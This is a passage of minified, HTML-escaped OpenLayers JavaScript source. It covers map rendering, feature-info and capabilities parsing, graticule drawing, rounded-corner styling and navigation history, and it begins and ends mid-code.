.style.left=parseInt(d.style.left)-a-1+"px";d.style.top=parseInt(d.style.top)+e+"px"&#125;,moveRoot:function(a)&#123;var b=this.map.getLayer(a.container.id);b instanceof OpenLayers.Layer.Vector.RootContainer&amp;&amp;(b=this.map.getLayer(this.container.id));b&amp;&amp;b.renderer.clear();OpenLayers.Renderer.Elements.prototype.moveRoot.apply(this,arguments);b&amp;&amp;b.redraw()&#125;,importSymbol:function(a)&#123;var b=this.container.id+"-"+a,c=this.symbolCache[b];if(c)return c;c=OpenLayers.Renderer.symbol[a];if(!c)throw Error(a+" is not a valid symbol name");a=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,0,0);for(var d=["m"],e=0;e&lt;c.length;e+=2)&#123;var f=c[e],g=c[e+1];a.left=Math.min(a.left,f);a.bottom=Math.min(a.bottom,g);a.right=Math.max(a.right,f);a.top=Math.max(a.top,g);d.push(f);d.push(g);0==e&amp;&amp;d.push("l")&#125;d.push("x e");c=d.join(" ");d=(a.getWidth()-a.getHeight())/2;0&lt;d?(a.bottom-=d,a.top+=d):(a.left+=d,a.right-=d);c=&#123;path:c,size:a.getWidth(),left:a.left,bottom:a.bottom&#125;;return this.symbolCache[b]=c&#125;,CLASS_NAME:"OpenLayers.Renderer.VML"&#125;);OpenLayers.Renderer.VML.LABEL_SHIFT=&#123;l:0,c:0.5,r:1,t:0,m:0.5,b:1&#125;;OpenLayers.Control.CacheRead=OpenLayers.Class(OpenLayers.Control,&#123;fetchEvent:"tileloadstart",layers:null,autoActivate:!0,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer(&#123;layer:c[b]&#125;);if(!this.layers)a.events.on(&#123;addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this&#125;)&#125;,addLayer:function(a)&#123;a.layer.events.register(this.fetchEvent,this,this.fetch)&#125;,removeLayer:function(a)&#123;a.layer.events.unregister(this.fetchEvent,this,this.fetch)&#125;,fetch:function(a)&#123;if(this.active&amp;&amp;window.localStorage&amp;&amp;a.tile instanceof OpenLayers.Tile.Image)&#123;var b=a.tile,c=b.url;!b.layer.crossOriginKeyword&amp;&amp;(OpenLayers.ProxyHost&amp;&amp;0===c.indexOf(OpenLayers.ProxyHost))&amp;&amp;(c=OpenLayers.Control.CacheWrite.urlMap[c]);if(c=window.localStorage.getItem("olCache_"+c))b.url=c,"tileerror"===a.type&amp;&amp;b.setImgSrc(c)&#125;&#125;,destroy:function()&#123;if(this.layers||this.map)&#123;var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer(&#123;layer:b[a]&#125;)&#125;this.map&amp;&amp;this.map.events.un(&#123;addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this&#125;);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Control.CacheRead"&#125;);OpenLayers.Protocol.WFS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,&#123;version:"1.0.0",CLASS_NAME:"OpenLayers.Protocol.WFS.v1_0_0"&#125;);OpenLayers.Format.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Format.XML,&#123;layerIdentifier:"_layer",featureIdentifier:"_feature",regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,gmlFormat:null,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a.documentElement;if(b)&#123;var c=this["read_"+b.nodeName];a=c?c.call(this,b):(new OpenLayers.Format.GML(this.options?this.options:&#123;&#125;)).read(a)&#125;return a&#125;,read_msGMLOutput:function(a)&#123;var b=[];if(a=this.getSiblingNodesByTagCriteria(a,this.layerIdentifier))for(var c=0,d=a.length;c&lt;d;++c)&#123;var e=a[c],f=e.nodeName;e.prefix&amp;&amp;(f=f.split(":")[1]);f=f.replace(this.layerIdentifier,"");if(e=this.getSiblingNodesByTagCriteria(e,this.featureIdentifier))for(var g=0;g&lt;e.length;g++)&#123;var h=e[g],k=this.parseGeometry(h),h=this.parseAttributes(h),h=new OpenLayers.Feature.Vector(k.geometry,h,null);h.bounds=k.bounds;h.type=f;b.push(h)&#125;&#125;return b&#125;,read_FeatureInfoResponse:function(a)&#123;var b=[];a=this.getElementsByTagNameNS(a,"*","FIELDS");for(var c=0,d=a.length;c&lt;d;c++)&#123;var e=a[c],f=&#123;&#125;,g,h=e.attributes.length;if(0&lt;h)for(g=0;g&lt;h;g++)&#123;var k=e.attributes[g];f[k.nodeName]=k.nodeValue&#125;else for(e=e.childNodes,g=0,h=e.length;g&lt;h;++g)k=e[g],3!=k.nodeType&amp;&amp;(f[k.getAttribute("name")]=k.getAttribute("value"));b.push(new OpenLayers.Feature.Vector(null,f,null))&#125;return b&#125;,getSiblingNodesByTagCriteria:function(a,b)&#123;var c=[],d,e,f,g;if(a&amp;&amp;a.hasChildNodes())&#123;d=a.childNodes;f=d.length;for(var h=0;h&lt;f;h++)&#123;for(g=d[h];g&amp;&amp;1!=g.nodeType;)g=g.nextSibling,h++;e=g?g.nodeName:"";0&lt;e.length&amp;&amp;-1&lt;e.indexOf(b)?c.push(g):(e=this.getSiblingNodesByTagCriteria(g,b),0&lt;e.length&amp;&amp;(0==c.length?c=e:c.push(e)))&#125;&#125;return c&#125;,parseAttributes:function(a)&#123;var b=&#123;&#125;;if(1==a.nodeType)&#123;a=a.childNodes;for(var c=a.length,d=0;d&lt;c;++d)&#123;var e=a[d];if(1==e.nodeType)&#123;var f=e.childNodes,e=e.prefix?e.nodeName.split(":")[1]:e.nodeName;0==f.length?b[e]=null:1==f.length&amp;&amp;(f=f[0],3==f.nodeType||4==f.nodeType)&amp;&amp;(f=f.nodeValue.replace(this.regExes.trimSpace,""),b[e]=f)&#125;&#125;&#125;return b&#125;,parseGeometry:function(a)&#123;this.gmlFormat||(this.gmlFormat=new OpenLayers.Format.GML);a=this.gmlFormat.parseFeature(a);var b,c=null;a&amp;&amp;(b=a.geometry&amp;&amp;a.geometry.clone(),c=a.bounds&amp;&amp;a.bounds.clone(),a.destroy());return&#123;geometry:b,bounds:c&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WMSGetFeatureInfo"&#125;);OpenLayers.Control.WMTSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,&#123;hover:!1,requestEncoding:"KVP",drillDown:!1,maxFeatures:10,clickCallback:"click",layers:null,queryVisible:!0,infoFormat:"text/html",vendorParams:&#123;&#125;,format:null,formatOptions:null,handler:null,hoverRequest:null,pending:0,initialize:function(a)&#123;a=a||&#123;&#125;;a.handlerOptions=a.handlerOptions||&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions));!0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,&#123;move:this.cancelHover,pause:this.getInfoForHover&#125;,OpenLayers.Util.extend(this.handlerOptions.hover||&#123;&#125;,&#123;delay:250&#125;)):(a=&#123;&#125;,a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||&#123;&#125;))&#125;,getInfoForClick:function(a)&#123;this.request(a.xy,&#123;&#125;)&#125;,getInfoForHover:function(a)&#123;this.request(a.xy,&#123;hover:!0&#125;)&#125;,cancelHover:function()&#123;this.hoverRequest&amp;&amp;(--this.pending,0&gt;=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0),this.hoverRequest.abort(),this.hoverRequest=null)&#125;,findLayers:function()&#123;for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d&amp;&amp;(c=a[d],!(c instanceof OpenLayers.Layer.WMTS)||(c.requestEncoding!==this.requestEncoding||this.queryVisible&amp;&amp;!c.getVisibility())||(b.push(c),this.drillDown&amp;&amp;!this.hover));--d);return b&#125;,buildRequestOptions:function(a,b)&#123;var c=this.map.getLonLatFromPixel(b),d=a.getURL(new OpenLayers.Bounds(c.lon,c.lat,c.lon,c.lat)),d=OpenLayers.Util.getParameters(d),c=a.getTileInfo(c);OpenLayers.Util.extend(d,&#123;service:"WMTS",version:a.version,request:"GetFeatureInfo",infoFormat:this.infoFormat,i:c.i,j:c.j&#125;);OpenLayers.Util.applyDefaults(d,this.vendorParams);return&#123;url:OpenLayers.Util.isArray(a.url)?a.url[0]:a.url,params:OpenLayers.Util.upperCaseObject(d),callback:function(c)&#123;this.handleResponse(b,c,a)&#125;,scope:this&#125;&#125;,request:function(a,b)&#123;b=b||&#123;&#125;;var c=this.findLayers();if(0&lt;c.length)&#123;for(var d,e,f=0,g=c.length;f&lt;g;f++)e=c[f],d=this.events.triggerEvent("beforegetfeatureinfo",&#123;xy:a,layer:e&#125;),!1!==d&amp;&amp;(++this.pending,d=this.buildRequestOptions(e,a),d=OpenLayers.Request.GET(d),!0===b.hover&amp;&amp;(this.hoverRequest=d));0&lt;this.pending&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait")&#125;&#125;,handleResponse:function(a,b,c)&#123;--this.pending;0&gt;=this.pending&amp;&amp;(OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"),this.pending=0);if(b.status&amp;&amp;(200&gt;b.status||300&lt;=b.status))this.events.triggerEvent("exception",&#123;xy:a,request:b,layer:c&#125;);else&#123;var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);var e,f;try&#123;e=this.format.read(d)&#125;catch(g)&#123;f=!0,this.events.triggerEvent("exception",&#123;xy:a,request:b,error:g,layer:c&#125;)&#125;f||this.events.triggerEvent("getfeatureinfo",&#123;text:b.responseText,features:e,request:b,xy:a,layer:c&#125;)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.WMTSGetFeatureInfo"&#125;);OpenLayers.Protocol.CSW.v2_0_2=OpenLayers.Class(OpenLayers.Protocol,&#123;formatOptions:null,initialize:function(a)&#123;OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.CSWGetRecords.v2_0_2(OpenLayers.Util.extend(&#123;&#125;,this.formatOptions)))&#125;,destroy:function()&#123;this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)&#125;,read:function(a)&#123;a=OpenLayers.Util.extend(&#123;&#125;,a);OpenLayers.Util.applyDefaults(a,this.options||&#123;&#125;);var b=new OpenLayers.Protocol.Response(&#123;requestType:"read"&#125;),c=this.format.write(a.params||a);b.priv=OpenLayers.Request.POST(&#123;url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c&#125;);return b&#125;,handleRead:function(a,b)&#123;if(b.callback)&#123;var c=a.priv;200&lt;=c.status&amp;&amp;300&gt;c.status?(a.data=this.parseData(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)&#125;&#125;,parseData:function(a)&#123;var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0&gt;=b.length?null:this.format.read(b)&#125;,CLASS_NAME:"OpenLayers.Protocol.CSW.v2_0_2"&#125;);OpenLayers.Format.WCSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,&#123;namespaces:&#123;wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows/1.1"&#125;,errorProperty:"operationsMetadata",readers:&#123;wcs:OpenLayers.Util.applyDefaults(&#123;Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Contents:function(a,b)&#123;b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)&#125;,CoverageSummary:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.push(c)&#125;,Identifier:function(a,b)&#123;b.identifier=this.getChildValue(a)&#125;,Title:function(a,b)&#123;b.title=this.getChildValue(a)&#125;,Abstract:function(a,b)&#123;b["abstract"]=this.getChildValue(a)&#125;,SupportedCRS:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b.supportedCRS||(b.supportedCRS=[]),b.supportedCRS.push(c))&#125;,SupportedFormat:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b.supportedFormat||(b.supportedFormat=[]),b.supportedFormat.push(c))&#125;&#125;,OpenLayers.Format.WCSCapabilities.v1.prototype.readers.wcs),ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WCSCapabilities.v1_1_0"&#125;);OpenLayers.Control.Graticule=OpenLayers.Class(OpenLayers.Control,&#123;autoActivate:!0,intervals:[45,30,20,10,5,2,1,0.5,0.2,0.1,0.05,0.01,0.005,0.002,0.001],displayInLayerSwitcher:!0,visible:!0,numPoints:50,targetSize:200,layerName:null,labelled:!0,labelFormat:"dm",lineSymbolizer:&#123;strokeColor:"#333",strokeWidth:1,strokeOpacity:0.5&#125;,labelSymbolizer:&#123;&#125;,gratLayer:null,initialize:function(a)&#123;a=a||&#123;&#125;;a.layerName=a.layerName||OpenLayers.i18n("Graticule");OpenLayers.Control.prototype.initialize.apply(this,[a]);this.labelSymbolizer.stroke=!1;this.labelSymbolizer.fill=!1;this.labelSymbolizer.label="$&#123;label&#125;";this.labelSymbolizer.labelAlign="$&#123;labelAlign&#125;";this.labelSymbolizer.labelXOffset="$&#123;xOffset&#125;";this.labelSymbolizer.labelYOffset="$&#123;yOffset&#125;"&#125;,destroy:function()&#123;this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments);this.gratLayer&amp;&amp;(this.gratLayer.destroy(),this.gratLayer=null)&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);if(!this.gratLayer)&#123;var a=new OpenLayers.Style(&#123;&#125;,&#123;rules:[new OpenLayers.Rule(&#123;symbolizer:&#123;Point:this.labelSymbolizer,Line:this.lineSymbolizer&#125;&#125;)]&#125;);this.gratLayer=new OpenLayers.Layer.Vector(this.layerName,&#123;styleMap:new OpenLayers.StyleMap(&#123;"default":a&#125;),visibility:this.visible,displayInLayerSwitcher:this.displayInLayerSwitcher&#125;)&#125;return this.div&#125;,activate:function()&#123;return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.addLayer(this.gratLayer),this.map.events.register("moveend",this,this.update),this.update(),!0):!1&#125;,deactivate:function()&#123;return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.map.events.unregister("moveend",this,this.update),this.map.removeLayer(this.gratLayer),!0):!1&#125;,update:function()&#123;var a=this.map.getExtent();if(a)&#123;this.gratLayer.destroyFeatures();var b=new OpenLayers.Projection("EPSG:4326"),c=this.map.getProjectionObject(),d=this.map.getResolution();c.proj&amp;&amp;"longlat"==c.proj.projName&amp;&amp;(this.numPoints=1);var e=this.map.getCenter(),f=new OpenLayers.Pixel(e.lon,e.lat);OpenLayers.Projection.transform(f,c,b);for(var e=this.targetSize*d,e=e*e,g,d=0;d&lt;this.intervals.length;++d)&#123;g=this.intervals[d];var h=g/2,k=f.offset(&#123;x:-h,y:-h&#125;),h=f.offset(&#123;x:h,y:h&#125;);OpenLayers.Projection.transform(k,b,c);OpenLayers.Projection.transform(h,b,c);if((k.x-h.x)*(k.x-h.x)+(k.y-h.y)*(k.y-h.y)&lt;=e)break&#125;f.x=Math.floor(f.x/g)*g;f.y=Math.floor(f.y/g)*g;var d=0,e=[f.clone()],h=f.clone(),l;do h=h.offset(&#123;x:0,y:g&#125;),l=OpenLayers.Projection.transform(h.clone(),b,c),e.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3&gt;++d);h=f.clone();do h=h.offset(&#123;x:0,y:-g&#125;),l=OpenLayers.Projection.transform(h.clone(),b,c),e.push(h);while(a.containsPixel(l)&amp;&amp;1E3&gt;++d);d=0;k=[f.clone()];h=f.clone();do h=h.offset(&#123;x:-g,y:0&#125;),l=OpenLayers.Projection.transform(h.clone(),b,c),k.unshift(h);while(a.containsPixel(l)&amp;&amp;1E3&gt;++d);h=f.clone();do h=h.offset(&#123;x:g,y:0&#125;),l=OpenLayers.Projection.transform(h.clone(),b,c),k.push(h);while(a.containsPixel(l)&amp;&amp;1E3&gt;++d);g=[];for(d=0;d&lt;k.length;++d)&#123;l=k[d].x;for(var f=[],m=null,n=Math.min(e[0].y,90),h=Math.max(e[e.length-1].y,-90),p=(n-h)/this.numPoints,n=h,h=0;h&lt;=this.numPoints;++h)&#123;var q=new OpenLayers.Geometry.Point(l,n);q.transform(b,c);f.push(q);n+=p;q.y&gt;=a.bottom&amp;&amp;!m&amp;&amp;(m=q)&#125;this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(m.x,a.bottom),l=&#123;value:l,label:this.labelled?OpenLayers.Util.getFormattedLonLat(l,"lon",this.labelFormat):"",labelAlign:"cb",xOffset:0,yOffset:2&#125;,this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))&#125;for(h=0;h&lt;e.length;++h)if(n=e[h].y,!(-90&gt;n||90&lt;n))&#123;f=[];d=k[0].x;p=(k[k.length-1].x-d)/this.numPoints;l=d;m=null;for(d=0;d&lt;=this.numPoints;++d)q=new OpenLayers.Geometry.Point(l,n),q.transform(b,c),f.push(q),l+=p,q.x&lt;a.right&amp;&amp;(m=q);this.labelled&amp;&amp;(m=new OpenLayers.Geometry.Point(a.right,m.y),l=&#123;value:n,label:this.labelled?OpenLayers.Util.getFormattedLonLat(n,"lat",this.labelFormat):"",labelAlign:"rb",xOffset:-2,yOffset:2&#125;,this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))&#125;this.gratLayer.addFeatures(g)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.Graticule"&#125;);OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||&#123;&#125;;OpenLayers.Rico.Corner=&#123;round:function(a,b)&#123;a=OpenLayers.Util.getElement(a);this._setOptions(b);var c=this.options.color;"fromElement"==this.options.color&amp;&amp;(c=this._background(a));var d=this.options.bgColor;"fromParent"==this.options.bgColor&amp;&amp;(d=this._background(a.offsetParent));this._roundCornersImpl(a,c,d)&#125;,changeColor:function(a,b)&#123;a.style.backgroundColor=b;for(var c=a.parentNode.getElementsByTagName("span"),d=0;d&lt;c.length;d++)c[d].style.backgroundColor=b&#125;,changeOpacity:function(a,b)&#123;var c="alpha(opacity="+100*b+")";a.style.opacity=b;a.style.filter=c;for(var d=a.parentNode.getElementsByTagName("span"),e=0;e&lt;d.length;e++)d[e].style.opacity=b,d[e].style.filter=c&#125;,reRound:function(a,b)&#123;var c=a.parentNode.childNodes[2];a.parentNode.removeChild(a.parentNode.childNodes[0]);a.parentNode.removeChild(c);this.round(a.parentNode,b)&#125;,_roundCornersImpl:function(a,b,c)&#123;this.options.border&amp;&amp;this._renderBorder(a,c);this._isTopRounded()&amp;&amp;this._roundTopCorners(a,b,c);this._isBottomRounded()&amp;&amp;this._roundBottomCorners(a,b,c)&#125;,_renderBorder:function(a,b)&#123;var c="1px solid "+this._borderColor(b);a.innerHTML="&lt;div "+("style='border-left: "+c+";"+("border-right: "+c)+"'")+"&gt;"+a.innerHTML+"&lt;/div&gt;"&#125;,_roundTopCorners:function(a,b,c)&#123;for(var d=this._createCorner(c),e=0;e&lt;this.options.numSlices;e++)d.appendChild(this._createCornerSlice(b,c,e,"top"));a.style.paddingTop=0;a.insertBefore(d,a.firstChild)&#125;,_roundBottomCorners:function(a,b,c)&#123;for(var d=this._createCorner(c),e=this.options.numSlices-1;0&lt;=e;e--)d.appendChild(this._createCornerSlice(b,c,e,"bottom"));a.style.paddingBottom=0;a.appendChild(d)&#125;,_createCorner:function(a)&#123;var b=document.createElement("div");b.style.backgroundColor=this._isTransparent()?"transparent":a;return b&#125;,_createCornerSlice:function(a,b,c,d)&#123;var e=document.createElement("span"),f=e.style;f.backgroundColor=a;f.display="block";f.height="1px";f.overflow="hidden";f.fontSize="1px";a=this._borderColor(a,b);this.options.border&amp;&amp;0==c?(f.borderTopStyle="solid",f.borderTopWidth="1px",f.borderLeftWidth="0px",f.borderRightWidth="0px",f.borderBottomWidth="0px",f.height="0px",f.borderColor=a):a&amp;&amp;(f.borderColor=a,f.borderStyle="solid",f.borderWidth="0px 1px");this.options.compact||c!=this.options.numSlices-1||(f.height="2px");this._setMargin(e,c,d);this._setBorder(e,c,d);return e&#125;,_setOptions:function(a)&#123;this.options=&#123;corners:"all",color:"fromElement",bgColor:"fromParent",blend:!0,border:!1,compact:!1&#125;;OpenLayers.Util.extend(this.options,a||&#123;&#125;);this.options.numSlices=this.options.compact?2:4;this._isTransparent()&amp;&amp;(this.options.blend=!1)&#125;,_whichSideTop:function()&#123;return this._hasString(this.options.corners,"all","top")||0&lt;=this.options.corners.indexOf("tl")&amp;&amp;0&lt;=this.options.corners.indexOf("tr")?"":0&lt;=this.options.corners.indexOf("tl")?"left":0&lt;=this.options.corners.indexOf("tr")?"right":""&#125;,_whichSideBottom:function()&#123;return this._hasString(this.options.corners,"all","bottom")||0&lt;=this.options.corners.indexOf("bl")&amp;&amp;0&lt;=this.options.corners.indexOf("br")?"":0&lt;=this.options.corners.indexOf("bl")?"left":0&lt;=this.options.corners.indexOf("br")?"right":""&#125;,_borderColor:function(a,b)&#123;return"transparent"==a?b:this.options.border?this.options.border:this.options.blend?this._blend(b,a):""&#125;,_setMargin:function(a,b,c)&#123;b=this._marginSize(b);c="top"==c?this._whichSideTop():this._whichSideBottom();"left"==c?(a.style.marginLeft=b+"px",a.style.marginRight="0px"):"right"==c?(a.style.marginRight=b+"px",a.style.marginLeft="0px"):(a.style.marginLeft=b+"px",a.style.marginRight=b+"px")&#125;,_setBorder:function(a,b,c)&#123;b=this._borderSize(b);c="top"==c?this._whichSideTop():this._whichSideBottom();"left"==c?(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth="0px"):"right"==c?(a.style.borderRightWidth=b+"px",a.style.borderLeftWidth="0px"):(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px");!1!=this.options.border&amp;&amp;(a.style.borderLeftWidth=b+"px",a.style.borderRightWidth=b+"px")&#125;,_marginSize:function(a)&#123;if(this._isTransparent())return 0;var b=[5,3,2,1],c=[3,2,1,0],d=[2,1],e=[1,0];return this.options.compact&amp;&amp;this.options.blend?e[a]:this.options.compact?d[a]:this.options.blend?c[a]:b[a]&#125;,_borderSize:function(a)&#123;var b=[5,3,2,1],c=[2,1,1,1],d=[1,0],e=[0,2,0,0];return this.options.compact&amp;&amp;(this.options.blend||this._isTransparent())?1:this.options.compact?d[a]:this.options.blend?c[a]:this.options.border?e[a]:this._isTransparent()?b[a]:0&#125;,_hasString:function(a)&#123;for(var b=1;b&lt;arguments.length;b++)if(0&lt;=a.indexOf(arguments[b]))return!0;return!1&#125;,_blend:function(a,b)&#123;var c=OpenLayers.Rico.Color.createFromHex(a);c.blend(OpenLayers.Rico.Color.createFromHex(b));return c&#125;,_background:function(a)&#123;try&#123;return OpenLayers.Rico.Color.createColorFromBackground(a).asHex()&#125;catch(b)&#123;return"#ffffff"&#125;&#125;,_isTransparent:function()&#123;return"transparent"==this.options.color&#125;,_isTopRounded:function()&#123;return this._hasString(this.options.corners,"all","top","tl","tr")&#125;,_isBottomRounded:function()&#123;return this._hasString(this.options.corners,"all","bottom","bl","br")&#125;,_hasSingleTextChild:function(a)&#123;return 1==a.childNodes.length&amp;&amp;3==a.childNodes[0].nodeType&#125;&#125;;OpenLayers.Control.NavigationHistory=OpenLayers.Class(OpenLayers.Control,&#123;type:OpenLayers.Control.TYPE_TOGGLE,previous:null,previousOptions:null,next:null,nextOptions:null,limit:50,autoActivate:!0,clearOnDeactivate:!1,registry:null,nextStack:null,previousStack:null,listeners:null,restoring:!1,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.registry=OpenLayers.Util.extend(&#123;moveend:this.getState&#125;,this.registry);a=&#123;trigger:OpenLayers.Function.bind(this.previousTrigger,this),displayClass:this.displayClass+" "+this.displayClass+"Previous"&#125;;OpenLayers.Util.extend(a,this.previousOptions);this.previous=new OpenLayers.Control.Button(a);a=&#123;trigger:OpenLayers.Function.bind(this.nextTrigger,this),displayClass:this.displayClass+" "+this.displayClass+"Next"&#125;;OpenLayers.Util.extend(a,this.nextOptions);this.next=new OpenLayers.Control.Button(a);this.clear()&#125;,onPreviousChange:function(a,b)&#123;a&amp;&amp;!this.previous.active?this.previous.activate():!a&amp;&amp;this.previous.active&amp;&amp;this.previous.deactivate()&#125;,onNextChange:function(a,b)&#123;a&amp;&amp;!this.next.active?this.next.activate():!a&amp;&amp;this.next.active&amp;&amp;this.next.deactivate()&#125;,destroy:function()&#123;OpenLayers.Control.prototype.destroy.apply(this);this.previous.destroy();this.next.destroy();this.deactivate();for(var a in this)this[a]=null&#125;,setMap:function(a)&#123;this.map=a;this.next.setMap(a);this.previous.setMap(a)&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.next.draw();this.previous.draw()&#125;,previousTrigger:function()&#123;var a=this.previousStack.shift(),b=this.previousStack.shift();void 0!=b?(this.nextStack.unshift(a),this.previousStack.unshift(b),this.restoring=!0,this.restore(b),this.restoring=!1,this.onNextChange(this.nextStack[0],this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1)):this.previousStack.unshift(a);return b&#125;,nextTrigger:function()&#123;var a=this.nextStack.shift();void 0!=a&amp;&amp;(this.previousStack.unshift(a),this.restoring=!0,this.restore(a),this.restoring=!1,this.onNextChange(this.nextStack[0],this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1));return a&#125;,clear:function()&#123;this.previousStack=[];this.previous.deactivate();this.nextStack=[];this.next.deactivate()&#125;,getState:function()&#123;return&#123;center:this.map.getCenter(),resolution:this.map.getResolution(),projection:this.map.getProjectionObject(),units:this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units&#125;&#125;,restore:function(a)&#123;var b,c;if(this.map.getProjectionObject()==a.projection)c=this.map.getZoomForResolution(a.resolution),b=a.center;else&#123;b=a.center.clone();b.transform(a.projection,this.map.getProjectionObject());c=a.units;var d=this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units;c=this.map.getZoomForResolution((c&amp;&amp;d?OpenLayers.INCHES_PER_UNIT[c]/OpenLayers.INCHES_PER_UNIT[d]:1)*a.resolution)&#125;this.map.setCenter(b,c)&#125;,setListeners:function()&#123;this.listeners=&#123;&#125;;for(var a in this.registry)this.listeners[a]=OpenLayers.Function.bind(function()&#123;if(!this.restoring)&#123;var b=this.registry[a].apply(this,arguments);this.previousStack.unshift(b);if(1&lt;this.previousStack.length)this.onPreviousChange(this.previousStack[1],this.previousStack.length-1);this.previousStack.length&gt;this.limit+1&amp;&amp;this.previousStack.pop();0&lt;this.nextStack.length&amp;&amp;(this.nextStack=[],this.onNextChange(null,0))&#125;return!0&#125;,this)&#125;,activate:function()&#123;var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.activate.apply(this))&#123;null==this.listeners&amp;&amp;this.setListeners();for(var b in this.listeners)this.map.events.register(b,this,this.listeners[b]);a=!0;0==this.previousStack.length&amp;&amp;this.initStack()&#125;return a&#125;,initStack:function()&#123;this.map.getCenter()&amp;&amp;this.listeners.moveend()&#125;,deactivate:function()&#123;var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.deactivate.apply(this))&#123;for(var b in this.listeners)this.map.events.unregister(b,this,this.listeners[b]);this.clearOnDeactivate&amp;&amp;this.clear();a=!0&#125;return a&#125;,CLASS_NAME:"OpenLayers.Control.NavigationHistory"&#125;);OpenLayers.Layer.UTFGrid=OpenLayers.Class(OpenLayers.Layer.XYZ,&#123;isBaseLayer:!1,projection:new OpenLayers.Projection("EPSG:900913"),useJSONP:!1,tileClass:OpenLayers.Tile.UTFGrid,initialize:function(a)&#123;OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,&#123;&#125;,a]);this.tileOptions=OpenLayers.Util.extend(&#123;utfgridResolution:this.utfgridResolution&#125;,this.tileOptions)&#125;,createBackBuffer:function()&#123;&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.UTFGrid(this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getFeatureInfo:function(a)&#123;var b=null;(a=this.getTileData(a))&amp;&amp;a.tile&amp;&amp;(b=a.tile.getFeatureInfo(a.i,a.j));return b&#125;,getFeatureId:function(a)&#123;var b=null;a=this.getTileData(a);a.tile&amp;&amp;(b=a.tile.getFeatureId(a.i,a.j));return 